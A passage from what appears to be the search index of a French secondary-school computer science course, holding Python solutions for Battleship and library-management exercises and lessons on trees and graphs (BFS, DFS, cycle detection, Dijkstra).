print(f\"Trouvez et coulez les {self.total_navires} navires !\")\n        print(\"Entrez les coordonn\u00e9es sous la forme 'x y' (ex: 3 5)\")\n\n        self.placer_navires()\n\n        while not self.jeu_termine():\n            self.afficher_grille()\n            print(f\"\\nCoups tir\u00e9s : {self.coups_tires}\")\n            print(f\"Navires coul\u00e9s : {self.navires_coules}/{self.total_navires}\")\n\n            try:\n                coordonnees = input(\"\\nCoordonn\u00e9es (x y) : \").split()\n                if len(coordonnees) != 2:\n                    print(\"Format invalide. Utilisez 'x y'\")\n                    continue\n\n                x, y = int(coordonnees[0]), int(coordonnees[1])\n                resultat = self.tirer(x, y)\n                print(f\"R\u00e9sultat : {resultat}\")\n\n            except ValueError:\n                print(\"Veuillez entrer des nombres valides.\")\n            except KeyboardInterrupt:\n                print(\"\\nPartie interrompue.\")\n                break\n\n        if self.jeu_termine():\n            self.afficher_grille(montrer_navires=True)\n            print(f\"\\n\ud83c\udf89 F\u00e9licitations ! Vous avez coul\u00e9 tous les navires en {self.coups_tires} coups !\")\n\n# Lancement du jeu\nif __name__ == \"__main__\":\n    jeu = BatailleNavale()\n    jeu.jouer()</code></pre> Solution : Gestionnaire de biblioth\u00e8que <pre><code>from datetime import datetime, timedelta\nimport json\nimport os\n\nclass GestionnaireBibliotheque:\n    def __init__(self, fichier_livres=\"livres.json\", fichier_emprunts=\"emprunts.json\"):\n        self.fichier_livres = fichier_livres\n        self.fichier_emprunts = fichier_emprunts\n        self.livres = self.charger_donnees(fichier_livres)\n        self.emprunts = self.charger_donnees(fichier_emprunts)\n        self.duree_emprunt = 14  # jours\n\n    def charger_donnees(self, fichier):\n        \"\"\"Charge les donn\u00e9es depuis un fichier JSON\"\"\"\n        if os.path.exists(fichier):\n            try:\n                with open(fichier, 'r', encoding='utf-8') as f:\n                    return json.load(f)\n            except:\n                return []\n        return []\n\n    def sauvegarder_donnees(self, donnees, fichier):\n        \"\"\"Sauvegarde les donn\u00e9es dans un fichier JSON\"\"\"\n        with open(fichier, 'w', encoding='utf-8') as f:\n            json.dump(donnees, f, indent=2, ensure_ascii=False)\n\n    def ajouter_livre(self):\n        \"\"\"Ajoute un nouveau livre\"\"\"\n        titre = input(\"Titre : \").strip()\n        auteur = input(\"Auteur : \").strip()\n        isbn = input(\"ISBN : \").strip()\n\n        if not all([titre, auteur, isbn]):\n            print(\"Tous les champs sont obligatoires.\")\n            return\n\n        # V\u00e9rifier si l'ISBN existe d\u00e9j\u00e0\n        if any(livre['isbn'] == isbn for livre in self.livres):\n            print(\"Un livre avec cet ISBN existe d\u00e9j\u00e0.\")\n            return\n\n        livre = {\n            'id': len(self.livres) + 1,\n            'titre': titre,\n            'auteur': auteur,\n            'isbn': isbn,\n            'disponible': True,\n            'nb_emprunts': 0\n        }\n\n        self.livres.append(livre)\n        self.sauvegarder_donnees(self.livres, self.fichier_livres)\n        print(f\"Livre '{titre}' ajout\u00e9 avec succ\u00e8s.\")\n\n    def afficher_livres(self):\n        \"\"\"Affiche tous les livres\"\"\"\n        if not self.livres:\n            print(\"Aucun livre dans la biblioth\u00e8que.\")\n            return\n\n        print(\"\\n=== CATALOGUE DES LIVRES ===\")\n        for livre in self.livres:\n            statut = \"\ud83d\udcd7 Disponible\" if livre['disponible'] else \"\ud83d\udcd5 Emprunt\u00e9\"\n            print(f\"{livre['id']}. {livre['titre']}\")\n            print(f\"   Auteur: {livre['auteur']}\")\n            print(f\"   ISBN: {livre['isbn']}\")\n            print(f\"   Statut: {statut}\")\n            print(f\"   Emprunts: {livre['nb_emprunts']}\")\n            print()\n\n    def rechercher_livres(self):\n        \"\"\"Recherche des livres par titre, auteur ou ISBN\"\"\"\n        terme = input(\"Rechercher (titre, auteur ou ISBN) : \").strip().lower()\n        if not terme:\n            return\n\n        resultats = []\n        for livre in self.livres:\n            if (terme in livre['titre'].lower() or \n                terme in livre['auteur'].lower() or \n                terme in livre['isbn'].lower()):\n                resultats.append(livre)\n\n        if resultats:\n            print(f\"\\n{len(resultats)} r\u00e9sultat(s) trouv\u00e9(s) :\")\n            for livre in resultats:\n                statut = \"Disponible\" if livre['disponible'] else \"Emprunt\u00e9\"\n                print(f\"- {livre['titre']} par {livre['auteur']} ({statut})\")\n        else:\n            print(\"Aucun livre trouv\u00e9.\")\n\n    def emprunter_livre(self):\n        \"\"\"Emprunte un livre\"\"\"\n        self.afficher_livres()\n\n        try:\n            livre_id = int(input(\"ID du livre \u00e0 emprunter : \"))\n            livre = next((l for l in self.livres if l['id'] == livre_id), None)\n\n            if not livre:\n                print(\"Livre introuvable.\")\n                return\n\n            if not livre['disponible']:\n                print(\"Ce livre est d\u00e9j\u00e0 emprunt\u00e9.\")\n                return\n\n            emprunteur = input(\"Nom de l'emprunteur : \").strip()\n            if not emprunteur:\n                print(\"Le nom de l'emprunteur est obligatoire.\")\n                return\n\n            # Cr\u00e9er l'emprunt\n            emprunt = {\n                'id': len(self.emprunts) + 1,\n                'livre_id': livre_id,\n                'emprunteur': emprunteur,\n                'date_emprunt': datetime.now().isoformat(),\n                'date_retour_prevue': (datetime.now() + timedelta(days=self.duree_emprunt)).isoformat(),\n                'date_retour_effective': None\n            }\n\n            # Mettre \u00e0 jour le livre\n            livre['disponible'] = False\n            livre['nb_emprunts'] += 1\n\n            # Sauvegarder\n            self.emprunts.append(emprunt)\n            self.sauvegarder_donnees(self.livres, self.fichier_livres)\n            self.sauvegarder_donnees(self.emprunts, self.fichier_emprunts)\n\n            print(f\"Livre emprunt\u00e9 par {emprunteur}.\")\n            print(f\"Date de retour pr\u00e9vue : {datetime.fromisoformat(emprunt['date_retour_prevue']).strftime('%d/%m/%Y')}\")\n\n        except ValueError:\n            print(\"Veuillez entrer un ID valide.\")\n\n    def retourner_livre(self):\n        \"\"\"Retourne un livre emprunt\u00e9\"\"\"\n        # Afficher les emprunts en cours\n        emprunts_actifs = [e for e in self.emprunts if e['date_retour_effective'] is None]\n\n        if not emprunts_actifs:\n            print(\"Aucun emprunt en cours.\")\n            return\n\n        print(\"\\n=== EMPRUNTS EN COURS ===\")\n        for emprunt in emprunts_actifs:\n            livre = next((l for l in self.livres if l['id'] == emprunt['livre_id']), None)\n            if livre:\n                date_retour = datetime.fromisoformat(emprunt['date_retour_prevue'])\n                retard = (datetime.now() - date_retour).days\n                statut_retard = f\" (RETARD: {retard} jours)\" if retard &gt; 0 else \"\"\n\n                print(f\"{emprunt['id']}. {livre['titre']}\")\n                print(f\"   Emprunteur: {emprunt['emprunteur']}\")\n                print(f\"   Retour pr\u00e9vu: {date_retour.strftime('%d/%m/%Y')}{statut_retard}\")\n                print()\n\n        try:\n            emprunt_id = int(input(\"ID de l'emprunt \u00e0 retourner : \"))\n            emprunt = next((e for e in self.emprunts if e['id'] == emprunt_id), None)\n\n            if not emprunt or emprunt['date_retour_effective']:\n                print(\"Emprunt introuvable ou d\u00e9j\u00e0 retourn\u00e9.\")\n                return\n\n            # Mettre \u00e0 jour l'emprunt\n            emprunt['date_retour_effective'] = datetime.now().isoformat()\n\n            # Mettre \u00e0 jour le livre\n            livre = next((l for l in self.livres if l['id'] == emprunt['livre_id']), None)\n            if livre:\n                livre['disponible'] = True\n\n            # Sauvegarder\n            self.sauvegarder_donnees(self.livres, self.fichier_livres)\n            self.sauvegarder_donnees(self.emprunts, self.fichier_emprunts)\n\n            print(\"Livre retourn\u00e9 avec succ\u00e8s.\")\n\n        except ValueError:\n            print(\"Veuillez entrer un ID valide.\")\n\n    def afficher_statistiques(self):\n        \"\"\"Affiche les statistiques de la biblioth\u00e8que\"\"\"\n        total_livres = len(self.livres)\n        livres_disponibles = len([l for l in self.livres if l['disponible']])\n        livres_empruntes = total_livres - livres_disponibles\n\n        emprunts_actifs = len([e for e in self.emprunts if e['date_retour_effective'] is None])\n        total_emprunts = len(self.emprunts)\n\n        # Livres les plus emprunt\u00e9s\n        livres_populaires = sorted(self.livres, key=lambda x: x['nb_emprunts'], reverse=True)[:5]\n\n        # Retards\n        retards = 0\n        for emprunt in self.emprunts:\n            if emprunt['date_retour_effective'] is None:\n                date_retour = datetime.fromisoformat(emprunt['date_retour_prevue'])\n                if datetime.now() &gt; date_retour:\n                    retards += 1\n\n        print(\"\\n=== STATISTIQUES ===\")\n        print(f\"Total de livres : {total_livres}\")\n        print(f\"Livres disponibles : {livres_disponibles}\")\n        print(f\"Livres emprunt\u00e9s : {livres_empruntes}\")\n        print(f\"Emprunts actifs : {emprunts_actifs}\")\n        print(f\"Total emprunts historique : {total_emprunts}\")\n        print(f\"Retards : {retards}\")\n\n        if livres_populaires:\n            print(\"\\nLivres les plus emprunt\u00e9s :\")\n            for i, livre in enumerate(livres_populaires, 1):\n                if livre['nb_emprunts'] &gt; 0:\n                    print(f\"{i}. {livre['titre']} ({livre['nb_emprunts']} emprunts)\")\n\n    def menu_principal(self):\n        \"\"\"Menu principal de l'application\"\"\"\n        while True:\n            print(\"\\n=== GESTIONNAIRE DE BIBLIOTH\u00c8QUE ===\")\n            print(\"1. Ajouter un livre\")\n            print(\"2. Afficher tous les livres\")\n            print(\"3. Rechercher des livres\")\n            print(\"4. Emprunter un livre\")\n            print(\"5. Retourner un livre\")\n            print(\"6. Statistiques\")\n            print(\"7. Quitter\")\n\n            choix = input(\"Votre choix : \").strip()\n\n            if choix == '1':\n                self.ajouter_livre()\n            elif choix == '2':\n                self.afficher_livres()\n            elif choix == '3':\n                self.rechercher_livres()\n            elif choix == '4':\n                self.emprunter_livre()\n            elif choix == '5':\n                self.retourner_livre()\n            elif choix == '6':\n                self.afficher_statistiques()\n            elif choix == '7':\n                print(\"Au revoir !\")\n                break\n            else:\n                print(\"Choix invalide.\")\n\n# Lancement de l'application\nif __name__ == \"__main__\":\n    bibliotheque = GestionnaireBibliotheque()\n    bibliotheque.menu_principal()</code></pre>"},{"location":"terminale/II-Structures_de_donnees/Cours/arbres/","title":"Arbres","text":"\ud83c\udf33 Les Arbres <p>Ma\u00eetrisez les structures hi\u00e9rarchiques pour organiser et traiter vos donn\u00e9es efficacement</p> \ud83c\udfaf D\u00e9finition Fondamentale \ud83c\udf32 Structure arborescente              Un arbre est une structure de donn\u00e9es hi\u00e9rarchique compos\u00e9e de n\u0153uds reli\u00e9s par des ar\u00eates, sans cycle. C'est un cas particulier de graphe connexe et acyclique, parfait pour repr\u00e9senter des relations hi\u00e9rarchiques.          \ud83d\udcca Exemple d'arbre <pre>       A (racine)\n      / \\\n     B   C\n    /   / \\\n   D   E   F (feuilles)</pre> \ud83d\udd17 Structure hi\u00e9rarchique                  Organisation en niveaux avec une racine unique et des relations parent-enfant clairement d\u00e9finies.              \ud83d\udeab Sans cycle                  Aucun chemin ne permet de revenir au point de d\u00e9part, garantissant une structure claire et navigable.              \ud83c\udfaf Connexe                  Tous les n\u0153uds sont accessibles depuis la racine, assurant une coh\u00e9rence structurelle.              \ud83d\udcda Vocabulaire Essentiel \ud83d\udd35 N\u0153ud (Sommet)                  \u00c9l\u00e9ment fondamental de l'arbre contenant une valeur ou des donn\u00e9es.              \ud83d\udc51 Racine                  N\u0153ud au sommet de l'arbre, point d'entr\u00e9e unique sans parent.              \ud83c\udf43 Feuille                  N\u0153ud terminal sans enfants, extr\u00e9mit\u00e9 de l'arbre.              \ud83d\udc68\u200d\ud83d\udc66 Parent/Enfant                  Relations directes : parent au-dessus, enfant en-dessous.              \ud83d\udc6b Fr\u00e8res                  N\u0153uds partageant le m\u00eame parent, au m\u00eame niveau.              \ud83c\udf3f Sous-arbre                  Arbre form\u00e9 par un n\u0153ud et tous ses descendants.              \ud83d\udccf Propri\u00e9t\u00e9s Importantes \ud83d\udcd0 Hauteur                  Longueur du plus long chemin de la racine \u00e0 une feuille. Mesure la \"profondeur\" maximale de l'arbre.              \ud83c\udf9a\ufe0f Profondeur d'un n\u0153ud                  Distance de la racine \u00e0 ce n\u0153ud. La racine a une profondeur de 0.              \ud83d\udd22 Degr\u00e9 d'un n\u0153ud                  Nombre d'enfants directs d'un n\u0153ud. D\u00e9termine la \"largeur\" locale.              \ud83d\udcca Taille                  Nombre total de n\u0153uds dans l'arbre. Mesure la complexit\u00e9 globale.                       \ud83d\udca1 Important : Ces propri\u00e9t\u00e9s sont fondamentales pour analyser la complexit\u00e9 des algorithmes sur les arbres.      \ud83c\udf32 Arbres Binaires \ud83d\udd00 Arbre binaire              Un arbre binaire est un arbre o\u00f9 chaque n\u0153ud a au maximum 2 enfants : un enfant gauche et un enfant droit. Cette contrainte simplifie les algorithmes et optimise les performances.          \u2696\ufe0f Structure \u00e9quilibr\u00e9e                  Limitation \u00e0 2 enfants maximum permettant un \u00e9quilibrage efficace et des op\u00e9rations optimis\u00e9es.                   \ud83d\udcbb Classe NoeudBinaire <pre><code>class NoeudBinaire:\n    def __init__(self, valeur, gauche=None, droite=None):\n        self.valeur = valeur\n        self.gauche = gauche\n        self.droite = droite\n\n    def est_feuille(self):\n        return self.gauche is None and self.droite is None</code></pre> \ud83c\udfd7\ufe0f Impl\u00e9mentation Python                  Structure de classe simple avec m\u00e9thodes essentielles pour la manipulation et l'analyse.                   \ud83d\udcbb Classe ArbreBinaire <pre><code>class ArbreBinaire:\n    def __init__(self, racine=None):\n        self.racine = racine\n\n    def est_vide(self):\n        return self.racine is None</code></pre> \ud83d\udccf Calcul de hauteur                  Algorithme r\u00e9cursif pour d\u00e9terminer la profondeur maximale de l'arbre.              \ud83d\udcbb M\u00e9thode hauteur <pre><code>def hauteur(self, noeud=None):\n    if noeud is None:\n        noeud = self.racine\n\n    if noeud is None:\n        return -1\n\n    if noeud.est_feuille():\n        return 0\n\n    hauteur_gauche = self.hauteur(noeud.gauche) if noeud.gauche else -1\n    hauteur_droite = self.hauteur(noeud.droite) if noeud.droite else -1\n\n    return 1 + max(hauteur_gauche, hauteur_droite)</code></pre> \ud83d\udd22 Calcul de taille                  Comptage r\u00e9cursif du nombre total de n\u0153uds dans l'arbre.              \ud83d\udcbb M\u00e9thode taille <pre><code>def taille(self, noeud=None):\n    if noeud is None:\n        noeud = self.racine\n\n    if noeud is None:\n        return 0\n\n    return 1 + self.taille(noeud.gauche) + self.taille(noeud.droite)</code></pre> \ud83c\udfd7\ufe0f Exemple de construction <pre>       1\n      / \\\n     2   3\n    /   / \\\n   4   5   6</pre> \ud83d\udcbb Construction manuelle <pre><code>racine = NoeudBinaire(1)\nracine.gauche = NoeudBinaire(2)\nracine.droite = NoeudBinaire(3)\nracine.gauche.gauche = NoeudBinaire(4)\nracine.droite.gauche = NoeudBinaire(5)\nracine.droite.droite = NoeudBinaire(6)\n\narbre = ArbreBinaire(racine)\nprint(f\"Hauteur: {arbre.hauteur()}\")  # 2\nprint(f\"Taille: {arbre.taille()}\")    # 6</code></pre>          \u26a1 Performance : Les arbres binaires \u00e9quilibr\u00e9s offrent une complexit\u00e9 O(log n) pour la plupart des op\u00e9rations."},{"location":"terminale/II-Structures_de_donnees/Cours/graphes/","title":"Graphes","text":""},{"location":"terminale/II-Structures_de_donnees/Cours/graphes/#les-graphes","title":"\ud83c\udf10 Les Graphes","text":"\ud83c\udfaf Introduction aux Graphes \ud83d\udcca Qu'est-ce qu'un graphe ?              Un graphe est une structure de donn\u00e9es fondamentale qui mod\u00e9lise des relations entre des objets. Il constitue l'une des abstractions les plus puissantes en informatique pour repr\u00e9senter des connexions complexes.          \ud83d\udd35 Sommets (N\u0153uds)                  Les objets ou entit\u00e9s du graphe. Ils repr\u00e9sentent les \u00e9l\u00e9ments que l'on souhaite connecter.                  Exemples : Personnes, villes, pages web, ordinateurs...              \ud83d\udd17 Ar\u00eates (Arcs)                  Les relations ou connexions entre les sommets. Elles mat\u00e9rialisent les liens qui unissent les objets.                  Exemples : Amiti\u00e9s, routes, liens hypertextes, c\u00e2bles r\u00e9seau...                       \ud83c\udf0d Omnipr\u00e9sence : Les graphes sont partout en informatique : r\u00e9seaux sociaux, GPS, Internet, circuits \u00e9lectroniques, intelligence artificielle...      \ud83d\udd04 Types de Graphes \u2194\ufe0f Graphe Non Orient\u00e9                  Les ar\u00eates n'ont pas de direction. Si A est reli\u00e9 \u00e0 B, alors B est automatiquement reli\u00e9 \u00e0 A.                   <pre>A ---- B\n|      |\nC ---- D</pre> Exemple : R\u00e9seau d'amiti\u00e9 (relation sym\u00e9trique)              \u27a1\ufe0f Graphe Orient\u00e9                  Les ar\u00eates ont une direction pr\u00e9cise (repr\u00e9sent\u00e9e par des fl\u00e8ches).                   <pre>A ---&gt; B\n^      |\nC &lt;--- D</pre> Exemple : R\u00e9seau de followers (relation asym\u00e9trique)              \u2696\ufe0f Graphe Pond\u00e9r\u00e9                  Les ar\u00eates poss\u00e8dent un poids (co\u00fbt, distance, temps, capacit\u00e9...).                   <pre>A --5-- B\n|       |\n3       2\n|       |\nC --1-- D</pre> Exemple : R\u00e9seau routier avec distances              \ud83d\udcbe Repr\u00e9sentations en M\u00e9moire \ud83c\udfaf Choix de repr\u00e9sentation              Le choix de la repr\u00e9sentation d\u00e9pend de la densit\u00e9 du graphe et des op\u00e9rations les plus fr\u00e9quentes. Chaque approche a ses avantages selon le contexte d'utilisation.          \ud83d\udcca Matrice d'Adjacence                  Tableau 2D o\u00f9 <code>matrice[i][j]</code> indique s'il y a une ar\u00eate entre le sommet i et le sommet j.                   \ud83d\udcbb Exemple de matrice <pre><code># Graphe A-B-C avec A reli\u00e9 \u00e0 B et C\nmatrice = [\n    [0, 1, 1],  # A : reli\u00e9 \u00e0 B(1) et C(2)\n    [1, 0, 0],  # B : reli\u00e9 \u00e0 A(0)\n    [1, 0, 0]   # C : reli\u00e9 \u00e0 A(0)\n]</code></pre> \u2705 Avantages : <ul> <li>V\u00e9rification d'adjacence en O(1)</li> <li>Simple \u00e0 impl\u00e9menter</li> <li>Id\u00e9al pour les graphes denses</li> </ul> \u274c Inconv\u00e9nients : <ul> <li>Espace O(n\u00b2) m\u00eame pour graphes peu denses</li> <li>Parcours des voisins en O(n)</li> </ul> \ud83d\udccb Liste d'Adjacence                  Chaque sommet maintient une liste de ses voisins directs.                   \ud83d\udcbb Exemple de liste <pre><code># M\u00eame graphe en liste d'adjacence\ngraphe = {\n    'A': ['B', 'C'],\n    'B': ['A'],\n    'C': ['A']\n}</code></pre> \u2705 Avantages : <ul> <li>Espace O(n + m) o\u00f9 m = nombre d'ar\u00eates</li> <li>Parcours des voisins efficace</li> <li>Id\u00e9al pour les graphes peu denses</li> </ul> \u274c Inconv\u00e9nients : <ul> <li>V\u00e9rification d'adjacence en O(degr\u00e9)</li> <li>Plus complexe \u00e0 impl\u00e9menter</li> </ul> Op\u00e9ration Matrice d'Adjacence Liste d'Adjacence Recommandation V\u00e9rifier adjacence O(1) O(degr\u00e9) Matrice pour fr\u00e9quent Parcourir voisins O(n) O(degr\u00e9) Liste plus efficace Espace m\u00e9moire O(n\u00b2) O(n + m) Liste pour graphes peu denses Ajouter ar\u00eate O(1) O(1) \u00c9quivalent \ud83c\udfd7\ufe0f Impl\u00e9mentation en Python \ud83c\udfaf Classe Graphe Compl\u00e8te              Impl\u00e9mentation robuste utilisant les listes d'adjacence avec support des graphes orient\u00e9s/non-orient\u00e9s et pond\u00e9r\u00e9s.          \ud83c\udfdb\ufe0f Structure de base                  Initialisation et gestion des sommets avec flexibilit\u00e9 d'orientation.                   \ud83d\udcbb Constructeur et ajout de sommets <pre><code>class Graphe:\n    def __init__(self, oriente=False):\n        self.sommets = {}  # dictionnaire : sommet -&gt; liste des voisins\n        self.oriente = oriente\n\n    def ajouter_sommet(self, sommet):\n        \"\"\"Ajoute un sommet au graphe\"\"\"\n        if sommet not in self.sommets:\n            self.sommets[sommet] = []</code></pre> \ud83d\udd17 Gestion des ar\u00eates                  Ajout et suppression d'ar\u00eates avec gestion automatique de l'orientation.                   \ud83d\udcbb M\u00e9thodes d'ar\u00eates <pre><code>def ajouter_arete(self, sommet1, sommet2, poids=1):\n    \"\"\"Ajoute une ar\u00eate entre deux sommets\"\"\"\n    self.ajouter_sommet(sommet1)\n    self.ajouter_sommet(sommet2)\n\n    # Ajouter l'ar\u00eate\n    self.sommets[sommet1].append((sommet2, poids))\n\n    # Si non orient\u00e9, ajouter l'ar\u00eate inverse\n    if not self.oriente:\n        self.sommets[sommet2].append((sommet1, poids))</code></pre> \ud83d\udd0d M\u00e9thodes d'analyse                  Fonctions utilitaires pour analyser la structure du graphe.              \ud83d\udcbb Analyse et v\u00e9rification <pre><code>def voisins(self, sommet):\n    \"\"\"Retourne la liste des voisins d'un sommet\"\"\"\n    return self.sommets.get(sommet, [])\n\ndef est_adjacent(self, sommet1, sommet2):\n    \"\"\"V\u00e9rifie si deux sommets sont adjacents\"\"\"\n    return any(voisin == sommet2 for voisin, _ in self.voisins(sommet1))\n\ndef degre(self, sommet):\n    \"\"\"Retourne le degr\u00e9 d'un sommet\"\"\"\n    return len(self.voisins(sommet))</code></pre> \ud83d\uddd1\ufe0f Suppression d'ar\u00eates                  Gestion de la suppression avec respect de l'orientation.              \ud83d\udcbb Suppression intelligente <pre><code>def supprimer_arete(self, sommet1, sommet2):\n    \"\"\"Supprime une ar\u00eate\"\"\"\n    if sommet1 in self.sommets:\n        self.sommets[sommet1] = [(v, p) for v, p in self.sommets[sommet1] \n                                if v != sommet2]\n\n    if not self.oriente and sommet2 in self.sommets:\n        self.sommets[sommet2] = [(v, p) for v, p in self.sommets[sommet2] \n                                if v != sommet1]</code></pre> \ud83d\ude80 Exemple d'utilisation pratique \ud83d\udcbb Construction et manipulation <pre><code># Cr\u00e9ation d'un graphe non orient\u00e9\ng = Graphe(oriente=False)\n\n# Ajout des ar\u00eates avec pond\u00e9ration\ng.ajouter_arete('A', 'B', 5)\ng.ajouter_arete('A', 'C', 3)\ng.ajouter_arete('B', 'D', 2)\ng.ajouter_arete('C', 'D', 1)\n\n# Analyse du graphe\nprint(f\"Degr\u00e9 de A: {g.degre('A')}\")  # 2\nprint(f\"A et D adjacents: {g.est_adjacent('A', 'D')}\")  # False\nprint(f\"Voisins de B: {g.voisins('B')}\")  # [('A', 5), ('D', 2)]</code></pre>              \ud83d\udca1 Flexibilit\u00e9 : Cette impl\u00e9mentation supporte automatiquement les graphes orient\u00e9s, non-orient\u00e9s et pond\u00e9r\u00e9s selon les param\u00e8tres fournis.          \ud83d\udd0d Algorithmes de Parcours \ud83c\udfaf Strat\u00e9gies d'exploration              Les algorithmes de parcours permettent d'explorer syst\u00e9matiquement tous les sommets d'un graphe. Chaque strat\u00e9gie a ses propres caract\u00e9ristiques et applications sp\u00e9cifiques.          \ud83d\udcca Parcours en Largeur (BFS)                  Explore le graphe niveau par niveau en utilisant une file (FIFO). Id\u00e9al pour trouver le plus court chemin.                   \ud83c\udfaf Principe : Visiter tous les voisins directs avant d'explorer plus loin                  \ud83d\udcbb Impl\u00e9mentation BFS <pre><code>from collections import deque\n\ndef parcours_largeur(graphe, sommet_depart):\n    \"\"\"Parcours en largeur (BFS)\"\"\"\n    visites = set()\n    file = deque([sommet_depart])\n    ordre_visite = []\n\n    while file:\n        sommet = file.popleft()  # FIFO\n\n        if sommet not in visites:\n            visites.add(sommet)\n            ordre_visite.append(sommet)\n\n            # Ajouter les voisins non visit\u00e9s\n            for voisin, _ in graphe.voisins(sommet):\n                if voisin not in visites:\n                    file.append(voisin)\n\n    return ordre_visite</code></pre> \u2705 Applications : <ul> <li>Plus court chemin (non pond\u00e9r\u00e9)</li> <li>D\u00e9tection de composantes connexes</li> <li>Analyse de r\u00e9seaux sociaux</li> </ul> \ud83d\udd04 Parcours en Profondeur (DFS)                  Explore le graphe en allant le plus loin possible avant de revenir en arri\u00e8re. Utilise une pile (LIFO) ou la r\u00e9cursion.                   \ud83c\udfaf Principe : Aller au bout d'un chemin avant d'explorer les alternatives                  \ud83d\udcbb Version r\u00e9cursive <pre><code>def parcours_profondeur_recursif(graphe, sommet, visites=None):\n    \"\"\"Parcours en profondeur r\u00e9cursif (DFS)\"\"\"\n    if visites is None:\n        visites = set()\n\n    visites.add(sommet)\n    print(sommet, end=' ')\n\n    for voisin, _ in graphe.voisins(sommet):\n        if voisin not in visites:\n            parcours_profondeur_recursif(graphe, voisin, visites)</code></pre> \ud83d\udcbb Version it\u00e9rative <pre><code>def parcours_profondeur_iteratif(graphe, sommet_depart):\n    \"\"\"Parcours en profondeur it\u00e9ratif (DFS)\"\"\"\n    visites = set()\n    pile = [sommet_depart]\n    ordre_visite = []\n\n    while pile:\n        sommet = pile.pop()  # LIFO\n\n        if sommet not in visites:\n            visites.add(sommet)\n            ordre_visite.append(sommet)\n\n            # Ajouter les voisins (ordre inverse)\n            for voisin, _ in reversed(graphe.voisins(sommet)):\n                if voisin not in visites:\n                    pile.append(voisin)\n\n    return ordre_visite</code></pre> \u2705 Applications : <ul> <li>D\u00e9tection de cycles</li> <li>Tri topologique</li> <li>R\u00e9solution de labyrinthes</li> </ul> Crit\u00e8re BFS (Largeur) DFS (Profondeur) Recommandation Structure de donn\u00e9es File (FIFO) Pile (LIFO) / R\u00e9cursion Selon l'objectif Complexit\u00e9 temporelle O(V + E) O(V + E) \u00c9quivalent Complexit\u00e9 spatiale O(V) O(h) o\u00f9 h = hauteur DFS pour \u00e9conomiser l'espace Plus court chemin \u2705 Optimal \u274c Non optimal BFS pour distances D\u00e9tection de cycles \u2705 Possible \u2705 Plus naturel DFS plus simple          \ud83e\udde0 Choix strat\u00e9gique : BFS pour l'exploration syst\u00e9matique et les distances, DFS pour l'analyse structurelle et la d\u00e9tection de motifs.      \ud83e\uddee Algorithmes Avanc\u00e9s sur les Graphes \ud83c\udfaf Algorithmes fondamentaux              Ces algorithmes r\u00e9solvent des probl\u00e8mes classiques sur les graphes : d\u00e9tection de cycles, calcul de plus courts chemins, et analyse de connectivit\u00e9.          \ud83d\udd04 D\u00e9tection de Cycle              Algorithme utilisant DFS pour d\u00e9tecter la pr\u00e9sence de cycles dans un graphe non orient\u00e9.               \ud83d\udca1 Principe : Un cycle existe si on rencontre un sommet d\u00e9j\u00e0 visit\u00e9 qui n'est pas le parent direct              \ud83d\udcbb Impl\u00e9mentation d\u00e9tection de cycle <pre><code>def a_un_cycle(graphe):\n    \"\"\"D\u00e9tecte s'il y a un cycle dans un graphe non orient\u00e9\"\"\"\n    visites = set()\n\n    def dfs(sommet, parent):\n        visites.add(sommet)\n\n        for voisin, _ in graphe.voisins(sommet):\n            if voisin not in visites:\n                if dfs(voisin, sommet):\n                    return True\n            elif voisin != parent:  # Cycle d\u00e9tect\u00e9 !\n                return True\n\n        return False\n\n    # V\u00e9rifier chaque composante connexe\n    for sommet in graphe.sommets:\n        if sommet not in visites:\n            if dfs(sommet, None):\n                return True\n\n    return False</code></pre> \ud83d\udee3\ufe0f Algorithme de Dijkstra              Calcule le plus court chemin depuis un sommet source vers tous les autres sommets dans un graphe pond\u00e9r\u00e9.               \u26a1 Complexit\u00e9 : O((V + E) log V) avec une file de priorit\u00e9              \ud83c\udfaf Algorithme principal \ud83d\udcbb Dijkstra complet <pre><code>import heapq\n\ndef dijkstra(graphe, depart):\n    \"\"\"Algorithme de Dijkstra pour le plus court chemin\"\"\"\n    distances = {sommet: float('inf') for sommet in graphe.sommets}\n    distances[depart] = 0\n    predecesseurs = {}\n\n    # File de priorit\u00e9 : (distance, sommet)\n    file_priorite = [(0, depart)]\n\n    while file_priorite:\n        distance_actuelle, sommet_actuel = heapq.heappop(file_priorite)\n\n        # Optimisation : ignorer si d\u00e9j\u00e0 trait\u00e9\n        if distance_actuelle &gt; distances[sommet_actuel]:\n            continue\n\n        # Examiner tous les voisins\n        for voisin, poids in graphe.voisins(sommet_actuel):\n            nouvelle_distance = distance_actuelle + poids\n\n            if nouvelle_distance &lt; distances[voisin]:\n                distances[voisin] = nouvelle_distance\n                predecesseurs[voisin] = sommet_actuel\n                heapq.heappush(file_priorite, (nouvelle_distance, voisin))\n\n    return distances, predecesseurs</code></pre> \ud83d\udd04 Reconstruction de chemin \ud83d\udcbb R\u00e9cup\u00e9ration du chemin <pre><code>def reconstruire_chemin(predecesseurs, depart, arrivee):\n    \"\"\"Reconstruit le chemin \u00e0 partir des pr\u00e9d\u00e9cesseurs\"\"\"\n    chemin = []\n    sommet = arrivee\n\n    while sommet is not None:\n        chemin.append(sommet)\n        sommet = predecesseurs.get(sommet)\n\n    chemin.reverse()\n    return chemin if chemin[0] == depart else []\n\n# Exemple d'utilisation\ndistances, predecesseurs = dijkstra(graphe, 'A')\nchemin_vers_D = reconstruire_chemin(predecesseurs, 'A', 'D')\nprint(f\"Plus court chemin A\u2192D: {chemin_vers_D}\")\nprint(f\"Distance: {distances['D']}\")</code></pre>              \ud83d\ude80 Performance : Dijkstra est optimal pour les graphes avec poids positifs. Pour les poids n\u00e9gatifs, utiliser Bellman-Ford.          \ud83c\udf0d Applications Pratiques des Graphes \ud83c\udfaf Domaines d'application              Les graphes mod\u00e9lisent de nombreux syst\u00e8mes r\u00e9els : r\u00e9seaux sociaux, syst\u00e8mes de navigation, r\u00e9seaux informatiques, analyse de donn\u00e9es, etc.          \ud83d\udc65 R\u00e9seaux Sociaux Mod\u00e9lisation : Utilisateurs = sommets, Relations = ar\u00eates                 Algorithmes : Suggestions d'amis, communaut\u00e9s, influence              \ud83d\uddfa\ufe0f Navigation GPS Mod\u00e9lisation : Intersections = sommets, Routes = ar\u00eates pond\u00e9r\u00e9es                 Algorithmes : Plus court chemin, optimisation de trajets              \ud83c\udf10 R\u00e9seaux Informatiques Mod\u00e9lisation : Routeurs = sommets, Connexions = ar\u00eates                 Algorithmes : Routage, d\u00e9tection de pannes, optimisation              \ud83d\udcca Analyse de Donn\u00e9es Mod\u00e9lisation : Entit\u00e9s = sommets, Relations = ar\u00eates                 Algorithmes : Clustering, classification, recommandations              